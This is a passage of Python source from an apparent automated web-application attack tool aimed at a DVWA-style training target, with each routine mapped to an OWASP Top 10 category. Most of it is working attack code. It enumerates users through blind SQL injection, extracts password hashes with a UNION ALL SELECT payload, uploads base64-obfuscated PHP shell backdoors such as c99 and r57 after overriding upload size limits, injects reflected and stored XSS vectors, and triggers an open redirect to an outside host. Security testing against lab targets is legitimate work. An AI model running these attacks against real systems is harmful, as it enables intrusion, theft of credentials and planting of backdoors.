        # regex for success
        regUserSuccess = re.compile(regnamestr,re.I+re.MULTILINE)
        """
            example result:
            <pre>ID: blah' OR first_name LIKE '%P%';#<br>First name: Pablo<br>Surname: Picasso</pre>
        """
        for field in fieldnames:
            for letter in range(ord('a'), ord('z') + 1):

                injection = "blah' OR %s LIKE '%s%%';#" % (field,chr(letter))
                resp = funcs.formSubmit(fp, targetpage, 0, {"id":injection}, sleep=False)
                vars.typecount['sqli_blind'][0] += 1
                if regUserSuccess.search(resp) and not errFail.search(resp):
                    cnt = 0
                    for r in re.findall(": (\w*)<",resp):
                        if cnt == 0:
                            f = r
                        if cnt == 1:
                            if f + " " + r not in usernames:
                                usernames.append(f + " " + r)
                        cnt += 1
                    #print "\n\n**********SQLi - enum usernames: %s\n\n" % f + " " + r
                    vars.typecount['sqli_blind'][1] += 1
                    self.htmlgen.writeHtmlTableCell(success=True, attackType="Blind SQLi",
                                            target=targetpage, vect=injection)
                else:
                    vars.typecount['sqli_blind'][2] += 1
                    self.htmlgen.writeHtmlTableCell(success=False, attackType="Blind SQLi",
                                            target=targetpage, vect=injection)

        if len(usernames) > 0:
            funcs.attackOutPut(funcs.stepFour, "discovered", "User objects discovered:")
            for u in usernames:
                funcs.attackOutPut(funcs.stepFive, "discovered", "%s" % u)
                vars.successfulVectors += 1
        else:
            funcs.attackOutPut(funcs.stepFour, "nothingfound", "No user objects discovered")
        ########################################################################
        funcs.attackOutPut(funcs.stepThree, "step", "SQLi - trying to get hashes for user names from the DB table in use")
        """
            try to enumerate password hashes
            the <pre> tag only shows up when there are results returned
        """
        userhashes = {}
        reghashstr = "<pre>"
        # regex for success
        regUserHashSuccess = re.compile(reghashstr,re.I+re.MULTILINE)
        targetfield = ''
        passwdlike = ''
        """
            example result:
            <pre>ID: blah' OR first_name LIKE '%P%';#<br>First name: Pablo<br>Surname: Picasso</pre>
        """
        possibleuser = difflib.get_close_matches('user', fieldnames)
        possiblepasswd = difflib.get_close_matches('password', fieldnames)
        
        """
            difflib - The best (no more than n) matches among the 
            possibilities are returned in a list, sorted by similarity 
            score, most similar first.
        """
        if len(possibleuser) >= 1:
            targetfield = possibleuser[0]
        if len(possiblepasswd) >= 1:
            passwdlike = possiblepasswd[0]

        if targetfield and passwdlike:
            for t in tablename:

                injection = "blah' UNION ALL SELECT %s,%s FROM %s#" % (targetfield,passwdlike,t)
                resp = funcs.formSubmit(fp, targetpage, 0, {"id":injection}, sleep=False)
                vars.typecount['sqli_blind'][0] += 1
                if regUserHashSuccess.search(resp) and not errFail.search(resp):
                    cnt = 2
                    for r in re.findall(": (\w*)<",resp):
                        if cnt % 2 == 0:
                            if r not in userhashes:
                                userhashes[r] = []
                                hashkey = r
                                cnt += 1
                                continue

                        if cnt % 2 == 1:
                            if r not in userhashes[hashkey]:
                                userhashes[hashkey].append(r)
                                cnt += 1
                                continue
                        #cnt += 1
                    #print "\n\n**********SQLi - psw hashes: %s\n\n" % r
                    vars.typecount['sqli_blind'][1] += 1
                    self.htmlgen.writeHtmlTableCell(success=True, attackType="Blind SQLi",
                                                    target=targetpage, vect=injection)
                else:
                    vars.typecount['sqli_blind'][2] += 1
                    self.htmlgen.writeHtmlTableCell(success=False, attackType="Blind SQLi",
                                                    target=targetpage, vect=injection)

        if len(userhashes) > 0:
            funcs.attackOutPut(funcs.stepFour, "discovered", "User object hashes discovered:")
            for key,vals in userhashes.items():
                funcs.attackOutPut(funcs.stepFive, "discovered", key)
                for val in vals:
                    funcs.attackOutPut(funcs.stepSix, "discovered", val)
                    vars.successfulVectors += 1
        else:
            funcs.attackOutPut(funcs.stepFour, "nothingfound", "No user object hashes discovered")
        ########################################################################
        print
    # EOF

    """
        attackupload covers areas of:
        OWASP Top 10 - A1: Injection
        OWASP Top 10 - A8: Failure to Restrict URL Access

        This attempts to upload and inject PHP shell back-doors.
        The actual files hold the content in base64 encoded form
        so there is no obvious clear text.
    """
    def attackupload(self, fp, targetpage):
        """
            Looks something like:
            [{'FileControl': 'uploaded', 'HiddenControl': {'MAX_FILE_SIZE': '100000'}}]
        """
        #attackfilename = ["c99.php", "r57.php","eicar.com"]
        attackfilename = []
        for infile in glob.glob(os.path.join(vars.getMalwarePath(), '*')):
            attackfilename.append(infile)

        uploadsuccesstr = "succesfully"
        regUploadSuccess = re.compile(uploadsuccesstr,re.I+re.MULTILINE)
        results = []
        #mpath = vars.getMalwarePath()
        resp = ""

        attackform = funcs.doFormDiscovery(fp, targetpage)
        if attackform:
            for f in attackfilename:
                fName = f.split('/')[1]
                resp = ""
                vars.typecount['upload'][0] += 1
                try:
                    fp.open(targetpage)
                    fp.select_form(nr=0)
                    for k,v in attackform[0]['HiddenControl'].items():
                        # modify hidden fields
                        fp.find_control(k).readonly = False
                        '''
                            alter the accepted body size since it
                            is enforced client-side
                        '''
                        fp[k] = '1000000000'
    
                    #filehandle = open(mpath + f)
                    filehandle = open(f)
                    fp.form.add_file(filehandle, None, fName)
                    fp.submit()
                    resp = fp.response().read()
                except:
                    pass

                if regUploadSuccess.search(resp):
                    results.append("%s shell uploaded" % fName)
                    """
                        malicious backdoor shell has been uploaded,
                        now open this up in a browser to display it
                    """
                    if vars.getUseBrowser():
                        try:
                            webbrowser.open(self.url + self.apppath + self.uploadpath + fName, new=2, autoraise=True)
                        except webbrowser.Error:
                            funcs.attackOutPut(funcs.stepFour, "info", "Could not instantiate the browser - check out %s" % self.url + self.apppath + self.uploadpath + fName)
                    vars.typecount['upload'][1] += 1
                    self.htmlgen.writeHtmlTableCell(success=True, attackType="Malicious Upload",
                                                    target=targetpage, vect=fName)
                else:
                    vars.typecount['upload'][2] += 1
                    self.htmlgen.writeHtmlTableCell(success=False, attackType="Malicious Upload",
                                                    target=targetpage, vect=fName)
        
        else:
            return None

        if len(results) >= 1:
            return results
        else:
            return None
    # EOF

    """
        attackxss_r covers areas of:
        OWASP Top 10 - A2: Cross-Site Scripting (XSS)

        Standard XSS attack vectors getting injected into a
        form in the hopes of getting displayed (this really
        is geared towards being browser based). Since we are
        doing XSS with a browser in other areas we will look
        for the injection in the response body here.
    """
    def attackxss_r(self, fp, targetpage):
        """
            construct regex to detect a successful injection.
            cmdsuccessstr is present after a POST that was
            not successful as an attack, if there is data
            between those tags that means the attack vector
            was successful
        """
        discattacks = []        
        pvect = ""

        with open(vars.getStaticPath() + 'xss.txt') as vectorz:
            # iterate thru vectors
            for p in vectorz:
                # split vector up based on delimiter :::
                p = p.split(":::")[0]
                pvect = self.sanitizeVector(vect=p, xss=True)

                tstr = funcs.formSubmit(fp, targetpage, 0, {"name":p}, sleep=False)
                vars.typecount['xss_r'][0] += 1
                if p in tstr:
                    discattacks.append(p)
                    #print "\n\n**********XSS: %s\n\n" % p
                    vars.typecount['xss_r'][1] += 1
                    self.htmlgen.writeHtmlTableCell(success=True, attackType="XSS",
                                            target=targetpage, vect=pvect)
                else:
                    vars.typecount['xss_r'][2] += 1
                    self.htmlgen.writeHtmlTableCell(success=False, attackType="XSS",
                                            target=targetpage, vect=pvect)

        if len(discattacks) > 0:
            return discattacks
        else:
            return None
    # EOF

    """
        attackxss_s covers areas of:
        OWASP Top 10 - A2: Cross-Site Scripting (XSS)

        Standard XSS attack vectors getting injected into a
        form in the hopes of getting stored in the DB.
    """
    def attackxss_s(self, fp, targetpage):
        
        discattacks = []
        pvect = ""

        with open(vars.getStaticPath() + 'xss.txt') as vectorz:
            # iterate thru vectors
            for p in vectorz:
                # split vector up based on delimiter :::
                p = p.split(":::")[0]
                pvect = self.sanitizeVector(vect=p, xss=True)

                tstr = funcs.formSubmit(fp, targetpage, 0, {"txtName":"test User", "mtxMessage":p}, sleep=False)
                vars.typecount['xss_s'][0] += 1
                if p in tstr:
                    discattacks.append(p)
                    #print "\n\n**********XSS: %s\n\n" % p
                    vars.typecount['xss_s'][1] += 1
                    self.htmlgen.writeHtmlTableCell(success=True, attackType="XSS",
                                            target=targetpage, vect=pvect)
                else:
                    vars.typecount['xss_s'][2] += 1
                    self.htmlgen.writeHtmlTableCell(success=False, attackType="XSS",
                                            target=targetpage, vect=pvect)

        if len(discattacks) > 0:
            return discattacks
        else:
            return None
    # EOF

    """
        attackredir covers an area of:
        OWASP Top 10 - A10: Unvalidated Redirects and Forwards

        Via browser this func hits a page within the target app itself
        An unwanted redirect to a site outside of the target app takes
        place
    """
    def attackredir(self, fp, targetpage):
        """
            the redir URL will look something like this:
            # http://target/dvwa/vulnerabilities/redir/?token=aHR0cDovL3lvdXNob3VsZG5vdGJlaGVyZS5iYXlzaG9yZW5ldHdvcmtzLmNvbS5jb20vZTQ1ODllZmZmNjU0ZDkxZTI2YjQzMzMzZGJmNDE0MjUveW91c2hvdWxkbm90YmVoZXJlLnBocA==
            
            where the token value:
                
                'aHR0cDovL3lvdXNob3VsZG5vdGJlaGVyZS5iYXlzaG9yZW5ldHdvcmtzLmNvbS9lNDU4OWVmZmY2NTRkOTFlMjZiNDMzMzNkYmY0MTQyNS95b3VzaG91bGRub3RiZWhlcmUucGhw'
            
            equals: http://youshouldnotbehere.bayshorenetworks.com/e4589efff654d91e26b43333dbf41425/youshouldnotbehere.php
        """
        funcs.attackOutPut(funcs.stepThree, "step", "Attempting use a browser window/tab to simulate a redirect outside the target application")
        try:
            time.sleep(8)
            webbrowser.open(targetpage + "?token=" + vars.getRedirToken())
            funcs.attackOutPut(funcs.stepThree, "step", "Check your browser to see if a redirect to a potentially malicious page took place")
        except webbrowser.Error:
            funcs.attackOutPut(funcs.stepFour, "info", "Could not instantiate the browser - hit this manually: %s" % targetpage + "?token=" +  + vars.redirtoken)

        return "attackredir"
    # EOF

    """
        A wrapper function so that the calling end of
        a function call can dynamically handle their
        end.
    """
    def call(self, fname, *args, **kw):
        fn = getattr(self, "attack"+fname)
        return fn(*args, **kw)
    # EOF
